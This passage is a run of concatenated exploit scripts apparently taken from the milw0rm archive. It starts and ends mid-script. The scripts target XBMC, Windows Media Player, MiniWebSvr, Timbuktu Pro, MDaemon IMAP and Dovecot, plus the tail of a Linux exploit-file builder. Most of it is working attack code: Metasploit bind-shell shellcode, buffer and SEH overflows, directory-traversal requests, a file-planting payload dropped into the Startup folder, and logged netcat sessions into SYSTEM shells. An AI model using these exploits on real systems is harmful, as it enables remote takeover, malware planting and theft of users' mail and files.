"\x00\x00\x00\xdd\x52\x00\x00\x0c\x50\x00\x00")

shellcode= ( #linux_ia32_bind -  LPORT=4444 Size=84 Encoder=None http://metasploit.com */
"\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x99\x89\xe1\xcd\x80\x96"
"\x43\x52\x66\x68\x11\x5c\x66\x53\x89\xe1\x6a\x66\x58\x50\x51\x56"
"\x89\xe1\xcd\x80\xb0\x66\xd1\xe3\xcd\x80\x52\x52\x56\x43\x89\xe1"
"\xb0\x66\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0"
"\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53"
"\x89\xe1\xcd\x80"
)

exe = exe.replace("DSIZE",struct.pack('<L',0x01010000 | 0xb67b))#dsize
exe = exe.replace("SSIZE",struct.pack('<L',0x49838da9 + 0x7000 ))
exe = exe.replace("COPYSIZE",struct.pack('<L',0xf7070707 ))
exe = exe.replace("CRAP","A"*768)

exe+="a" #alignment
exe+=struct.pack('<L', 0xbfff9010 ) * 16000 #return address
exe+="\x90"* 0x4000
exe+=shellcode

fout = open("exploit.exe","w")
fout.write(exe)
fout.close()

# milw0rm.com [2008-01-07]
#!/usr/bin/env python 
'''
Xbmc get tag from file name request remote buffer overflow 8.10 !!! 
 
Tested:Win xp sp2 eng
Vendor url:http://xbmc.org/ 
 
versions affected: 
Linux windows < tested 
other versions are also possibly affected. 
Release date:April the 1st 2009 

Restrictions:No filtering needed.
This exploit happens when parsing and overly long id3
tag to the web server.Dont think i covered this much
in the poc code as i was running out of time on this
exploit.


We are able to overwrite the exception handlers also so 
creating a reliable exploit for vista and xps3 shouldn't 
be to hard have a look there are some modules loaded with 
out /safe seh. 

Credits to n00b for finding the buffer overflow and writing 
poc code and exploit.

----------
Disclaimer
----------
The information in this advisory and any of its
demonstrations is provided "as is" without any
warranty of any kind.

I am not liable for any direct or indirect damages
caused as a result of using the information or
demonstrations provided in any part of this advisory.
Educational use only..!!
'''


import sys, socket 
import struct

port = 80 
host = sys.argv[1] 

Start_url ='xbmcCmds/xbmcHttp?command=GetTagFromFilename(C:/'
Junk_buffer = 'A'*1033
Jump_esp = struct.pack('<L',0x77F84143)

Shell_code=(#win32_bind -EXITFUNC=seh LPORT=4444 http://metasploit.com */
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4c\x36\x4b\x4e"
"\x4d\x34\x4a\x4e\x49\x4f\x4f\x4f\x4f\x4f\x4f\x4f\x42\x46\x4b\x58"
"\x4e\x36\x46\x32\x46\x32\x4b\x48\x45\x34\x4e\x53\x4b\x58\x4e\x37"
"\x45\x30\x4a\x47\x41\x30\x4f\x4e\x4b\x58\x4f\x44\x4a\x51\x4b\x58"
"\x4f\x45\x42\x52\x41\x30\x4b\x4e\x49\x44\x4b\x48\x46\x33\x4b\x58"
"\x41\x50\x50\x4e\x41\x53\x42\x4c\x49\x39\x4e\x4a\x46\x58\x42\x4c"
"\x46\x57\x47\x50\x41\x4c\x4c\x4c\x4d\x50\x41\x30\x44\x4c\x4b\x4e"
"\x46\x4f\x4b\x33\x46\x35\x46\x32\x4a\x32\x45\x47\x45\x4e\x4b\x48"
"\x4f\x55\x46\x52\x41\x30\x4b\x4e\x48\x46\x4b\x58\x4e\x50\x4b\x54"
"\x4b\x48\x4f\x35\x4e\x31\x41\x50\x4b\x4e\x43\x50\x4e\x32\x4b\x38"
"\x49\x48\x4e\x36\x46\x32\x4e\x31\x41\x36\x43\x4c\x41\x53\x4b\x4d"
"\x46\x46\x4b\x48\x43\x44\x42\x53\x4b\x38\x42\x34\x4e\x30\x4b\x38"
"\x42\x47\x4e\x41\x4d\x4a\x4b\x48\x42\x34\x4a\x50\x50\x45\x4a\x36"
"\x50\x58\x50\x34\x50\x30\x4e\x4e\x42\x45\x4f\x4f\x48\x4d\x48\x36"
"\x43\x35\x48\x36\x4a\x46\x43\x33\x44\x53\x4a\x46\x47\x37\x43\x37"
"\x44\x53\x4f\x45\x46\x55\x4f\x4f\x42\x4d\x4a\x46\x4b\x4c\x4d\x4e"
"\x4e\x4f\x4b\x33\x42\x35\x4f\x4f\x48\x4d\x4f\x55\x49\x38\x45\x4e"
"\x48\x56\x41\x48\x4d\x4e\x4a\x30\x44\x30\x45\x45\x4c\x36\x44\x50"
"\x4f\x4f\x42\x4d\x4a\x46\x49\x4d\x49\x30\x45\x4f\x4d\x4a\x47\x35"
"\x4f\x4f\x48\x4d\x43\x35\x43\x55\x43\x55\x43\x55\x43\x55\x43\x34"
"\x43\x35\x43\x34\x43\x45\x4f\x4f\x42\x4d\x48\x56\x4a\x46\x41\x51"
"\x4e\x45\x48\x36\x43\x35\x49\x58\x41\x4e\x45\x59\x4a\x46\x46\x4a"
"\x4c\x51\x42\x47\x47\x4c\x47\x45\x4f\x4f\x48\x4d\x4c\x46\x42\x41"
"\x41\x55\x45\x55\x4f\x4f\x42\x4d\x4a\x56\x46\x4a\x4d\x4a\x50\x52"
"\x49\x4e\x47\x55\x4f\x4f\x48\x4d\x43\x45\x45\x45\x4f\x4f\x42\x4d"
"\x4a\x46\x45\x4e\x49\x44\x48\x58\x49\x44\x47\x55\x4f\x4f\x48\x4d"
"\x42\x35\x46\x45\x46\x35\x45\x55\x4f\x4f\x42\x4d\x43\x39\x4a\x46"
"\x47\x4e\x49\x57\x48\x4c\x49\x47\x47\x55\x4f\x4f\x48\x4d\x45\x45"
"\x4f\x4f\x42\x4d\x48\x46\x4c\x46\x46\x56\x48\x56\x4a\x36\x43\x46"
"\x4d\x56\x49\x48\x45\x4e\x4c\x46\x42\x35\x49\x35\x49\x32\x4e\x4c"
"\x49\x48\x47\x4e\x4c\x56\x46\x54\x49\x48\x44\x4e\x41\x53\x42\x4c"
"\x43\x4f\x4c\x4a\x50\x4f\x44\x34\x4d\x32\x50\x4f\x44\x34\x4e\x52"
"\x43\x59\x4d\x48\x4c\x47\x4a\x53\x4b\x4a\x4b\x4a\x4b\x4a\x4a\x36"
"\x44\x37\x50\x4f\x43\x4b\x48\x41\x4f\x4f\x45\x57\x46\x54\x4f\x4f"
"\x48\x4d\x4b\x35\x47\x45\x44\x45\x41\x55\x41\x35\x41\x45\x4c\x36"
"\x41\x30\x41\x55\x41\x35\x45\x45\x41\x35\x4f\x4f\x42\x4d\x4a\x56"
"\x4d\x4a\x49\x4d\x45\x30\x50\x4c\x43\x35\x4f\x4f\x48\x4d\x4c\x36"
"\x4f\x4f\x4f\x4f\x47\x43\x4f\x4f\x42\x4d\x4b\x48\x47\x55\x4e\x4f"
"\x43\x48\x46\x4c\x46\x46\x4f\x4f\x48\x4d\x44\x45\x4f\x4f\x42\x4d"
"\x4a\x36\x42\x4f\x4c\x48\x46\x30\x4f\x45\x43\x35\x4f\x4f\x48\x4d"
"\x4f\x4f\x42\x4d\x5a"

)

End_url ='.mp3)'

# create a socket object called 'c' 
c = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 

# connect to the socket 
c.connect((host, port)) 

Request = (Start_url + Junk_buffer + Jump_esp + Shell_code + End_url)

# create a file-like object to read 
fileobj = c.makefile('r', 0) 

# Ask the server for the file 
fileobj.write("GET /"+Request+" HTTP/1.1\n\n") 

# milw0rm.com [2009-04-01]
#!/usr/bin/python
##########################################################################
# Bug discovered by Jun Mao of VeriSign iDefense 
# http://www.securityfocus.com/bid/26789
# CVE-2007-3901
# Coded by Matteo Memelli aka ryujin
# http://www.gray-world.net http://www.be4mind.com
# Tested on: Windows 2000 SP4 English, DirectX 7.0 (4.07.00.0700) 
#------------------------------------------------------------------------
# THX TO all the guys at www.offensive-security.com
# EXPECIALLY TO ONE: THX FOR "NOT" HELPING MUTS!!! 
# I DONT FEEL FC4'd ANYMORE NOW :P muhahahaha
#------------------------------------------------------------------------
##########################################################################  
# On Windows Media Player Open---> http://attacker/anyfile.smi
# .smi extension is necessary, filename can be anything.
#  
# badrobot:/home/matte# ./mplayer.py 
# [+] Listening on port 80
# [+] Connection accepted from: 192.168.1.243
# [+] Payload sent, check your shell on 192.168.1.243 port 4444
# badrobot:/home/matte# nc 192.168.1.243 4444
# Microsoft Windows 2000 [Version 5.00.2195]
# (C) Copyright 1985-2000 Microsoft Corp.
#
# C:\Documents and Settings\ryujin\Desktop>ipconfig
# ipconfig
#
# Windows 2000 IP Configuration
#
# Ethernet adapter Local Area Connection:
#
#        Connection-specific DNS Suffix  . : 
#        IP Address. . . . . . . . . . . . : 192.168.1.243
#        Subnet Mask . . . . . . . . . . . : 255.255.255.0
#        Default Gateway . . . . . . . . . : 
#
# C:\Documents and Settings\ryujin\Desktop>
##########################################################################
 
from socket import *

# SMI BODY
body = """<SAMI>
<HEAD>
<STYLE TYPE="text/css">
<!--
P {
font-size: 1em;
font-family: Arial;
font-weight: normal;
color: #FFFFFF;
background: #000000;
text-align: center;
padding-left: 5px;
padding-right: 5px;
padding-bottom: 2px;
}
.ENUSCC { Name: English; lang: EN-US-CC; }
-->
</STYLE>
</HEAD>
<BODY>
<SYNC Start="0" pippo=\""""

# Metasploit bind shell on port 4444 EXITFUNC seh
shellcode = (
"\xfc\x6a\xeb\x4d\xe8\xf9\xff\xff\xff\x60\x8b\x6c\x24\x24\x8b\x45"
"\x3c\x8b\x7c\x05\x78\x01\xef\x8b\x4f\x18\x8b\x5f\x20\x01\xeb\x49"
"\x8b\x34\x8b\x01\xee\x31\xc0\x99\xac\x84\xc0\x74\x07\xc1\xca\x0d"
"\x01\xc2\xeb\xf4\x3b\x54\x24\x28\x75\xe5\x8b\x5f\x24\x01\xeb\x66"
"\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb\x03\x2c\x8b\x89\x6c\x24\x1c\x61"
"\xc3\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x40"
"\x08\x5e\x68\x8e\x4e\x0e\xec\x50\xff\xd6\x66\x53\x66\x68\x33\x32"
"\x68\x77\x73\x32\x5f\x54\xff\xd0\x68\xcb\xed\xfc\x3b\x50\xff\xd6"
"\x5f\x89\xe5\x66\x81\xed\x08\x02\x55\x6a\x02\xff\xd0\x68\xd9\x09"
"\xf5\xad\x57\xff\xd6\x53\x53\x53\x53\x53\x43\x53\x43\x53\xff\xd0"
"\x66\x68\x11\x5c\x66\x53\x89\xe1\x95\x68\xa4\x1a\x70\xc7\x57\xff"
"\xd6\x6a\x10\x51\x55\xff\xd0\x68\xa4\xad\x2e\xe9\x57\xff\xd6\x53"
"\x55\xff\xd0\x68\xe5\x49\x86\x49\x57\xff\xd6\x50\x54\x54\x55\xff"
"\xd0\x93\x68\xe7\x79\xc6\x79\x57\xff\xd6\x55\xff\xd0\x66\x6a\x64"
"\x66\x68\x63\x6d\x89\xe5\x6a\x50\x59\x29\xcc\x89\xe7\x6a\x44\x89"
"\xe2\x31\xc0\xf3\xaa\xfe\x42\x2d\xfe\x42\x2c\x93\x8d\x7a\x38\xab"
"\xab\xab\x68\x72\xfe\xb3\x16\xff\x75\x44\xff\xd6\x5b\x57\x52\x51"
"\x51\x51\x6a\x01\x51\x51\x55\x51\xff\xd0\x68\xad\xd9\x05\xce\x53"
"\xff\xd6\x6a\xff\xff\x37\xff\xd0\x8b\x57\xfc\x83\xc4\x64\xff\xd6"
"\x52\xff\xd0\x68\xf0\x8a\x04\x5f\x53\xff\xd6\xff\xd0"
)

body += 21988*'A'                                 
body += '\x90'*16                                 # NOP Slide
body += shellcode + 'C'*67                        # to SEH... 
body += '\xeb\x06\x90\x90\x2b\x1e\xe1\x77'        # ShortJmp, and SEH overwrite
body += '\x90'*4 + '\xE9\x6B\xFE\xFF\xFF\x90\x90' # NearJmp, back to shellcode
body += 143505*'E' + '">'
body += '<P Class="ENUSCC">NICE MOVIE!</P></SYNC></BODY></SAMI>'

# RESPONSE HEADER 
header = (
'HTTP/1.1 200 OK\r\n'
'Content-Type: application/smil\r\n'
'\r\n'
)

evilbuf = header + body
s = socket(AF_INET, SOCK_STREAM)
s.bind(("0.0.0.0", 80))
s.listen(1)
print "[+] Listening on port 80"
c, addr = s.accept()
print "[+] Connection accepted from: %s" % (addr[0])
c.recv(1024)
c.send(evilbuf)
print "[+] Payload sent, check your shell on %s port 4444" % addr[0]
c.close()
s.close()

# milw0rm.com [2008-01-08]
import socket
import sys

print '---------------------------------------------------------'
print 'MiniWebSvr 0.0.9a Directory Transversal Vulnerability'
print 'Project URL: http://miniwebsvr.sourceforge.net/'
print 'Author: gbr'
print 'Tested on Windows XP SP2'
print '---------------------------------------------------------'

host = "127.0.0.1"
port = 8080

if sys.argv[1:]:
        host = sys.argv[1]
        if sys.argv[2:]:
                port = int(sys.argv[2])

try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.send("GET /%../../../../../../../../../../../boot.ini HTTP/1.0\r\n\r\n")
        while True:
                data = s.recv(4096)
                if not data:
                        break
                print data

except:
        print "Connection Error"

# milw0rm.com [2008-03-03]
# Core Security Technologies - CoreLabs Advisory
#  http://www.coresecurity.com/corelabs

# Title: Timbuktu Pro Remote Path Traversal and Log Injection
# Advisory ID: CORE-2008-0204
# Advisory URL: http://www.coresecurity.com/?action=item&id=2166
# Date published: 2008-03-11
# Date of last update: 2008-03-11
# Vendors contacted: Motorola
# Release mode: Forced release

#  Proof of concept code follows. This PoC allows a remote attacker to
# upload a file to an arbitrary location on the victim's machine and forge
# peer information on the log lines of the victim's application.

from sys        import argv
from socket     import *
from struct     import pack

#from utils      import printFormatted
#from time import sleep

init_send_op_packet =   (   '\x00\x01\x60\x00\x00\x52\x00\x25'
                            '\x00\x22\x02\x01\x00\x04\x03\x07'
                            '\x00\x05\x00\x01\x00\x00\x00\xf1'
                            '\x06\x00\xf7\x76\xdd\x77\x00\x00'
                            '\x00\x00\x08\x7c\x67\x60\x00\x00'
                            '\x00\x00\x00\x00\x00\x00\x00\x00'
                            '\x00\x00\x18\xf1\x06\x00\xd1\x90'
                            '\xbc\x60\x38\xf1\x06\x00\x32\x94'
                            '\xc1\x60\x50\x92\xc4\x60\x00\x00'
                            '\x00\x00\x18\x92\xc4\x60\x2d\xbe'
                            '\x80\x7c\x08\x7c\x67\x60\x20\x46'
                        )

second_send_op_packet  = (  '\x00\x01\x61\x00\x00\x52\x00\x25'
                            '\x00\x22\x02\x01\x00\x04\x03\x07'
                            '\x00\x05\x00\x01\x10\x00\xe0\xf0'
                            '\x06\x00\x51\x05\x91\x7c\x28\x09'
                            '\x08\x00\x6d\x05\x91\x7c\x1c\xf1'
                            '\x06\x00\x02\x00\x00\x00\x10\x00'
                            '\x00\x00\xb8\xf5\xbe\x60\x00\x00'
                            '\xac\x00\x00\x00\x00\x00\xbd\xf5'
                            '\xbe\x60\x30\x90\xc4\x60\x07\x00'
                            '\x00\x00\xd0\x13\x63\x60\x71\xfb'
                            '\x90\x7c\x40\xf0\x06\x00\x0e\x00'
                            )

peer_info_exchange      = ( '\x00\x01\x62\x00\x00\xb0\x00\x23'
                            '\x07\x22\x03\x07\x70\x2c\xa5\x51'
                            '\x4c\xca\xe3\xfb\x70\x2c\xa5\x51'
                            '\x4c\xca\xe3\xfb\x00\x09'
                            '%(user_name)s'
                            '\x01\x97'
                            '%(host_name)s'
                            ''
                            '\x00\x00\x01\x02\x00\x04'
                            '\xb1\x1c\x39\x51\x00\x00\x00\x00'
                            '%(guest_ip_address)s'
                            '\x00\x00\x00\x00\x00\x00'
                            '\x00\x00\x00\x00\x00\x00'
                            )

ack_peer_info           =   '\xff'

attach_info_packet      = ('\xfb\x00\x00\x00\x00'
                            'BINAmdos'
                            '\xc2\x12\x49\xaf\xbd\x35\xac\x98'
                            '\x00\x00\x00\x00'
                            '%(attachment_length)s'
                            '\x00\x00\x00\x00'
                            '\xff\xff\xff\xff\x00\x00\x00\x00'
                            '\x00\x00\x00\x00\x00\x00\x00\x00'
                            '\x00\x00\x00\x00\x00\x00'
                            '%(attachment_filename)s'
                            )

attach_info_ack1        =  '\xf9\x00'

# Transfer file content here !!!
# \xF8 + 2 byte length + data

attach_file_ack1      =  '\xf7'

attach_file_ack2      =  '\xfa'


class Tb2FileSender:
    '''
    Fake timbuktu client that implements the 'Notes' feature to send a
    message with a file attached to it.
    '''

    def __init__(self, target, fake_src_ip, fake_hostname, fake_username, dest_filename, file_content):
        '''
        Setup TCP Connection to standard port TCP/407
        '''
        self.sck = socket(AF_INET, SOCK_STREAM)
        self.sck.connect((target, 407))
        self.fake_src_ip    = fake_src_ip
        self.fake_hostname  = fake_hostname     # Peer computer name
        self.fake_username  = fake_username     # Peer user name
        self.dest_filename  = dest_filename     # Destination filename including path (like ../../a.exe)
        self.file_content   = file_content      # Content of the destination file

    def sendAndRecv(self, packet, log, expected_response_length=0x500, print_response=False):
        self.sck.send(packet)
        if log:
            print '[-] %s' % log
        if expected_response_length > 0:
            resp = self.sck.recv(expected_response_length)
            if print_response:
                #printFormatted(resp)
                print '-' * 70 + '\n'
            return resp
        return None

    def getPascalString(self, str):
        '''
        Format the strings as 1 Byte Length + String.
        '''
        return pack('B', len(str)) + str

    def createFakePeerInfoPacket(self):
        '''
        Create a packet with forged guest information to avoid giving away
        real info in the log files.
        '''
        #
        # Ohhh... by the way, these two names goes diretly to the log file... ehehhee  :) 
        #
        guest_host_name      = self.fake_hostname.replace('\\n', '\r\n')
        guest_user_name      = self.fake_username.replace('\\n', '\r\n')

        username_max_len     = 0x37 # This is not the application real limit,
        hostname_max_len     = 0x3f #   but it is the limit for this packet.

        host_name            = self.getPascalString(guest_host_name)
        user_name            = self.getPascalString(guest_user_name)

        # Pad the string to fill the empty space and avoid packet length recalculation
        host_name           += ('\x00' * (hostname_max_len - len(guest_host_name)))
        user_name           += ('\x00' * (username_max_len - len(guest_user_name)))

        guest_ip_address     = self.fake_src_ip.split('.')
        guest_ip_address     = pack('BBBB', int(guest_ip_address[0]), int(guest_ip_address[1]), int(guest_ip_address[2]), int(guest_ip_address[3]))

        return peer_info_exchange % vars()

    def getAttachContent(self):
        '''
        Retrieve the content of the local file and send it as the attach content.
        '''
        fd      = open(self.file_content, 'rb')
        data    = fd.read()
        fd.close()
        return data

    def send(self):
        '''
        Send a sequence of packet to upload our data to the filename and path
        specified by the user's parameters.
        '''

        # Begin protocol negotiation with the target
        self.sendAndRecv(init_send_op_packet,               'Note Operation initial packet sent.')
        self.sendAndRecv(second_send_op_packet,             'Note Operation negotiation packet sent.')

        # Send the packet with our fake info to fool the logs  :) 
        self.sendAndRecv(self.createFakePeerInfoPacket(),   'Peer info packet sent.')
        self.sendAndRecv(ack_peer_info,                     'Ack peer info packet sent.')

        # Setup attachment packets that contain information about the file being transfered
        max_trx_chunk_size  = 0x5B4
        trx_until_resync    = 0x16C5

        payload             = self.getAttachContent()
        payload_length      = len(payload)
        attachment_length   = pack('>L', payload_length)

        #
        # Send info about the attachment.
        #
        # The '\' character is nedded to bypass the application filter.
        # This is actually the Bug !
        attachment_filename  = self.getPascalString('\\' + self.dest_filename.replace('\\', '/'))

        attach_info          = attach_info_packet % vars()

        self.sendAndRecv(attach_info     ,   'Attachment info sent.')
        self.sendAndRecv(attach_info_ack1,   'Attachment intermediate info sent.')

        # Create a list with the chunks to send and prepare their headers is appropriate
        attachment_content   = list()

        # We check if the data to send fits into one set of chunks.
        if payload_length < max_trx_chunk_size:
            attachment_content.append('\xF8' + pack('>H', payload_length) + payload)
        else:
            # If the data is bigger than one chunk, then send multiple chunks and their headers.
            curr_pos        = 0     # keeps our current position into the data file content
            resync_chunk    = True  # flag to indicate if a new set of chunk should be set
            pos_in_chunk    = 0     # keeps our position into the current chunk set
            do_recv         = False # flag to indicate if recv is needed to receive target data

            while curr_pos <= payload_length:
                do_recv      = False
                # Is this the last chunk ?
                if curr_pos > 0 and pos_in_chunk != trx_until_resync:
                    # If it is the last chunk, then just set length to the rest of the data
                    if trx_until_resync - pos_in_chunk < max_trx_chunk_size:
                        chunk_length = trx_until_resync - pos_in_chunk
                        do_recv = True
                    else:
                        # Otherwise, set the data length as usual because it's an intermediate chunk
                        chunk_length = max_trx_chunk_size data         = ''
                else:
                    # Start a new set of chunks and check if this is not the last set
                    # If it is, then don't set the maximun size, just the rest of the length.
                    data         = '\xF8'   # Set the chunk set header
                    if payload_length - curr_pos < trx_until_resync:
                        chunk_length = payload_length - curr_pos
                        data        += pack('>H', chunk_length)
                    else:
                        # This is not the last chunk, so we set the maximun size and begin
                        #   it transmittion.
                        chunk_length = max_trx_chunk_size
                        data        += pack('>H', trx_until_resync) pos_in_chunk = 0

                # Append the current chunk into a list to be sent later
                attachment_content.append((do_recv, data + payload[curr_pos : curr_pos + chunk_length]))
                curr_pos        += chunk_length
                pos_in_chunk    += chunk_length

        #
        # Send file content in small chunks
        #
        print '[-] Beginning file transfer... (this may take some time)'
        for chunk in attachment_content:
            if chunk[0]:
                do_recv = 0x500
            else:
                do_recv = 0
            self.sendAndRecv(chunk[1], '', do_recv)
            #sleep(0.5)
        print '[-] File transfer complete'

        # Send the final ACKs to allow the program to create the remote file.
        self.sendAndRecv(attach_file_ack1,   'Note body intermediate info sent.')
        self.sendAndRecv(attach_file_ack2,   'Note body intermediate info sent.')

        # Close the connection here to avoid the program displaying any message
        self.sck.close()
        return


if __name__ == "__main__":
    if len(argv) != 7:
        print (r'\nUsage:\n\n%s <target> <fake_source_ip> <fake_hostname> '
                '<fake_username> <dest_filename_with_path> <file2upload>\n\n'
                'Example:\n\n'
                '%s victim.com 1.2.3.4 trust.com yourAdmin "..\..\..\Documents And Settings\All Users\Start Menu\Programs\Startup\evil.exe" c:\payload.exe' % (argv[0], argv[0]) )
    else:
        target          = argv[1]
        fake_src_ip     = argv[2]
        fake_hostname   = argv[3]
        fake_username   = argv[4]
        dest_filename   = argv[5]
        file_content    = argv[6]

        tb2 = Tb2FileSender(target, fake_src_ip, fake_hostname, fake_username, dest_filename, file_content)
        tb2.send()

# milw0rm.com [2008-03-11]
#!/usr/bin/python
###############################################################################
#
# MDAEMON (POST AUTH) REMOTE R00T IMAP FETCH COMMAND UNIVERSAL EXPLOIT 0day
# Bug discovered and coded by Matteo Memelli aka ryujin 
# http://www.gray-world.net http://www.be4mind.com
#
# Affected Versions : MDaemon IMAP server v9.6.4 
# Tested on OS      : Windows 2000 SP4 English
#                     Windows XP Sp2 English
#                     Windows 2003 Standard Edition Italian
# Discovery Date               : 03/13/2008
#
#-----------------------------------------------------------------------------
#
# muts AS YOU CAN SEE, I ALWAYS MAINTAIN MY PROMISES! LOL
#
# Thx to Silvia for feeding my obsessions
# Thx to didNot at #offsec 
# (yes he doesn't look like Silvia but he's a nice guy LOL)
# and to www.offensive-security.com
#
#-----------------------------------------------------------------------------
##############################################################################
# [+] Connecting to imap server...
# * OK test.local IMAP4rev1 MDaemon 9.6.4 ready
#
# [+] Logging in...
# 0001 OK LOGIN completed
#
# [+] Selecting Inbox Folder...
# * FLAGS (\Seen \Answered \Flagged \Deleted \Draft \Recent)
# * 16 EXISTS
# * 16 RECENT
# * OK [UNSEEN 1] first unseen
# * OK [UIDVALIDITY 1205411202] UIDs valid
# * OK [UIDNEXT 17] Predicted next UID
# * OK [PERMANENTFLAGS (\Seen \Answered \Flagged \Deleted \Draft)] .
# 0002 OK [READ-WRITE] SELECT completed
#
# [+] We need at least one message in Inbox, appending one...
# + Ready for append literal
#
# [+] What would you like for dinner? SPAGHETTI AND PWNSAUCE?
# * 17 EXISTS
# * 17 RECENT
# 0003 OK [APPENDUID 1205411202 17] APPEND completed
#
# [+] DINNER'S READY: Sending Evil Buffer...
# [+] DONE! Check your shell on 192.168.1.195:4444
#
#
# matte@badrobot:~$ nc 192.168.1.195 4444
# (UNKNOWN) [192.168.1.195] 4444 (?) : Connection refused
# matte@badrobot:~$ nc 192.168.1.195 4444
# Microsoft Windows 2000 [Version 5.00.2195]
# (C) Copyright 1985-2000 Microsoft Corp.
#
# C:\MDaemon\APP>whoami
# whoami
# NT AUTHORITY\SYSTEM
#
# C:\MDaemon\APP>
##############################################################################

from socket import *
from optparse import OptionParser
import sys, time

print "[*********************************************************************]"
print "[*                                                                   *]"
print "[*    MDAEMON (POST AUTH) REMOTE R00T IMAP FETCH COMMAND EXPLOIT     *]"
print "[*                      DISCOVERED AND CODED                         *]"
print "[*                               by                                  *]"
print "[*                         MATTEO MEMELLI                            *]" 
print "[*                            (ryujin)                               *]" 
print "[*              www.be4mind.com - www.gray-world.net                 *]"
print "[*                                                                   *]"
print "[*********************************************************************]"
usage =  "%prog -H TARGET_HOST -P TARGET_PORT -l USER -p PASSWD"
parser = OptionParser(usage=usage)
parser.add_option("-H", "--target_host", type="string",
                  action="store", dest="HOST",
                  help="Target Host")
parser.add_option("-P", "--target_port", type="int",
                  action="store", dest="PORT",
                  help="Target Port")
parser.add_option("-l", "--login-user", type="string",
                  action="store", dest="USER",
                  help="User login")
parser.add_option("-p", "--login-password", type="string",
                  action="store", dest="PASSWD",
                  help="User password")
(options, args) = parser.parse_args()
HOST    = options.HOST
PORT    = options.PORT
USER    = options.USER
PASSWD  = options.PASSWD
if not (HOST and PORT and USER and PASSWD):
   parser.print_help()
   sys.exit()

# windows/shell_bind_tcp - 317 bytes
# http://www.metasploit.com
# EXITFUNC=thread, LPORT=4444
shellcode = (
"\xfc\x6a\xeb\x4d\xe8\xf9\xff\xff\xff\x60\x8b\x6c\x24\x24\x8b"
"\x45\x3c\x8b\x7c\x05\x78\x01\xef\x8b\x4f\x18\x8b\x5f\x20\x01"
"\xeb\x49\x8b\x34\x8b\x01\xee\x31\xc0\x99\xac\x84\xc0\x74\x07"
"\xc1\xca\x0d\x01\xc2\xeb\xf4\x3b\x54\x24\x28\x75\xe5\x8b\x5f"
"\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb\x03\x2c\x8b"
"\x89\x6c\x24\x1c\x61\xc3\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c"
"\x8b\x70\x1c\xad\x8b\x40\x08\x5e\x68\x8e\x4e\x0e\xec\x50\xff"
"\xd6\x66\x53\x66\x68\x33\x32\x68\x77\x73\x32\x5f\x54\xff\xd0"
"\x68\xcb\xed\xfc\x3b\x50\xff\xd6\x5f\x89\xe5\x66\x81\xed\x08"
"\x02\x55\x6a\x02\xff\xd0\x68\xd9\x09\xf5\xad\x57\xff\xd6\x53"
"\x53\x53\x53\x53\x43\x53\x43\x53\xff\xd0\x66\x68\x11\x5c\x66"
"\x53\x89\xe1\x95\x68\xa4\x1a\x70\xc7\x57\xff\xd6\x6a\x10\x51"
"\x55\xff\xd0\x68\xa4\xad\x2e\xe9\x57\xff\xd6\x53\x55\xff\xd0"
"\x68\xe5\x49\x86\x49\x57\xff\xd6\x50\x54\x54\x55\xff\xd0\x93"
"\x68\xe7\x79\xc6\x79\x57\xff\xd6\x55\xff\xd0\x66\x6a\x64\x66"
"\x68\x63\x6d\x89\xe5\x6a\x50\x59\x29\xcc\x89\xe7\x6a\x44\x89"
"\xe2\x31\xc0\xf3\xaa\xfe\x42\x2d\xfe\x42\x2c\x93\x8d\x7a\x38"
"\xab\xab\xab\x68\x72\xfe\xb3\x16\xff\x75\x44\xff\xd6\x5b\x57"
"\x52\x51\x51\x51\x6a\x01\x51\x51\x55\x51\xff\xd0\x68\xad\xd9"
"\x05\xce\x53\xff\xd6\x6a\xff\xff\x37\xff\xd0\x8b\x57\xfc\x83"
"\xc4\x64\xff\xd6\x52\xff\xd0\x68\xef\xce\xe0\x60\x53\xff\xd6"
"\xff\xd0"
)

s = socket(AF_INET, SOCK_STREAM)
print " [+] Connecting to imap server..."
s.connect((HOST, PORT))
print s.recv(1024)
print " [+] Logging in..."
s.send("0001 LOGIN %s %s\r\n" % (USER, PASSWD))
print s.recv(1024)
print " [+] Selecting Inbox Folder..."
s.send("0002 SELECT Inbox\r\n")
print s.recv(1024)
print " [+] We need at least one message in Inbox, appending one..."
s.send('0003 APPEND Inbox {1}\r\n')
print s.recv(1024)
print " [+] What would you like for dinner? SPAGHETTI AND PWNSAUCE?"
s.send('SPAGHETTI AND PWNSAUCE\r\n')
print s.recv(1024)
print " [+] DINNER'S READY: Sending Evil Buffer..."
# Seh overwrite at 532 Bytes 
# pop edi; pop ebp; ret; From mdaemon/HashCash.dll
EVIL = "A"*528 + "\xEB\x06\x90\x90" + "\x8b\x11\xdc\x64" + "\x90"*8 + shellcode + 'C'*35 
s.send("A654 FETCH 2:4 (FLAGS BODY[" + EVIL + " (DATE FROM)])\r\n")
s.close()
print " [+] DONE! Check your shell on %s:%d" % (HOST, 4444)

# milw0rm.com [2008-03-13]
#lame Dovecot IMAP [1.0.10 -> 1.1rc3] Exploit
#Here's an exploit for the recent TAB vulnerability in Dovecot.
#It's nothing special since in the wild there are few to none
#targets because of the special option which has to be set.
#see CVE Entry CVE-2008-1218
#Exploit written by Kingcope
import sys
import imaplib

print "Dovecot IMAP [1.0.10 -> 1.1rc2] Exploit"
print "Prints out all E-Mails for any account if special configuration option is set"
print "Exploit written by kingcope\n"

if len(sys.argv)<3:
     print "usage: %s <hostname/ip address> <account> [-nossl]" % sys.argv[0]
     exit(0);

if len(sys.argv)>3 and sys.argv[3] == "-nossl":
	M = imaplib.IMAP4(sys.argv[1])
